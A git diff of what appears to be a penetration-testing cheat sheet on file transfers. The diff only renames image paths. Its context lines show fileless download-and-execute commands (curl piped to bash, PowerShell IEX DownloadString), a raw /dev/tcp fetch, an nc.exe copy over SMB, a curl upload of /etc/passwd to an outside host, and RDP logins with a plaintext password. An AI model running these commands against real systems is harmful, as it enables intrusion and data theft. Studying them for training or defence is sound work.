@@ -34,7 +34,7 @@ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 ### **Fileless Download with wget**
 
@@ -44,7 +44,7 @@ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **Download a File Using cURL**
 
@@ -64,7 +64,7 @@ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | ba
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Download with Bash (/dev/tcp)
 
@@ -76,7 +76,7 @@ exec 3<>/dev/tcp/10.10.10.32/80
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **HTTP GET Request**
 
@@ -86,7 +86,7 @@ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **Print the Response**
 
@@ -96,7 +96,7 @@ cat <&3
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## PowerShell Web Downloads
 
@@ -108,7 +108,7 @@ cat <&3
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **DownloadString - Fileless Method**
 
@@ -118,7 +118,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **Invoke-WebRequest**
 
@@ -128,11 +128,11 @@ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption><p>You can use the aliases <code>iwr</code>, <code>curl</code>, and <code>wget</code> instead of the <code>Invoke-WebRequest</code> full name</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption><p>You can use the aliases <code>iwr</code>, <code>curl</code>, and <code>wget</code> instead of the <code>Invoke-WebRequest</code> full name</p></figcaption></figure>
 
 ### **Common Errors with PowerShell**
 
-<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption><p>There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -UseBasicParsing</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption><p>There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -UseBasicParsing</p></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```
@@ -140,7 +140,7 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```powershell-session
@@ -148,7 +148,7 @@ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption><p>Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption><p>Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command</p></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```
@@ -168,7 +168,7 @@ sudo impacket-smbserver share -smb2support /tmp/smbshare
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Copy a File from the SMB Server
 
@@ -178,7 +178,7 @@ copy \\192.168.220.133\share\nc.exe
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption><p>New versions of Windows block unauthenticated guest access</p></figcaption></figure>
 
@@ -281,7 +281,7 @@ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/e
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## PowerShell Web Uploads
 
@@ -438,7 +438,7 @@ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/ho
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **Mounting Using xfreerdp**
 
@@ -448,7 +448,7 @@ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/h
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Evading Detection
 
